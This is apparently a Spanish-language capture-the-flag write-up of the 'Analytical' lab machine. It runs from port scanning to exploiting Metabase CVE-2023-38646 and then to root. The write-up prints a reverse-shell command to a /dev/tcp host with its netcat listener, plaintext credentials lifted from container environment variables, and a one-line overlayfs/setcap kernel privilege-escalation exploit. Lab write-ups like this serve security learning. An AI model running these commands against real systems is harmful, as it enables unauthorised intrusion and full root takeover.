- debemos hacer el tipico escaneo de puertos con nmap, y vemos que tenemos el puerto 80 y 22 abiertos y configurar el archivos hosts, vamos a ver que es lo que hay en el puerto 80, hay una web y tenemos la siguiente info:

	- Nombres de empleados:
		![[Pasted image 20240415195015.png]]
	- formulario de contacto:
		![[Pasted image 20240415195039.png]]
	- un loggin:
		![[Pasted image 20240415195221.png]]
		"http://data.analytical.htb/auth/login?redirect=%2F"
		![[Pasted image 20240415195311.png]]

- si nos fijamos en el loggin que hemos encontrado podemos ver que esta en un subdominio "data" y que aparece el servicio de "metabase" el cual tiene la vulnerabilidad de "[CVE-2023-38646](https://github.com/SUT0L/CVE-2023-38646.git)", ahora vamos a hacer uso del exploit y obtener una revershell (tambien podemos hacer hacer este proceso con metasploit)
```shell
./exploit --url 'http://data.analytical.htb' --command 'sh -i >& /dev/tcp/10.10.14.78/4444 0>&1'
```
```bash
nc -lcnp 4444
```

- hacemos un tratamiento de la tty para trabajar mejor y vamos a buscamos informacion relevante
![[Pasted image 20240415223108.png]]
esto implica que estamos en un docker, por ello vamos a ver las variables de entorno (si estamos en meterpreter debemos usar una shell no vale con el comando shell debe ser una "original")

```shell
printenv
```

![[Pasted image 20240415230912.png]]
```bash

credenciales
META_USER=metalytics
META_PASS=An4lytics_ds20223#
LOGNAME=metabase
```

- con estos credenciales podemos intentar conectarnos por ssh a la maquina (asi podemos salir del docker ya que en el docker solo esta corriendo el servicio de metabase), y vamos a ver la version del kernel de linux
```bash
uname -a
```
![[Pasted image 20240416000939.png]]

- vemos que tiene una vulnerabilidad, por lo que vamos a explotarla
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("sudo -i")'
```
![[Pasted image 20240416001322.png]]

- ya podemos ver la flag
![[Pasted image 20240416001310.png]]

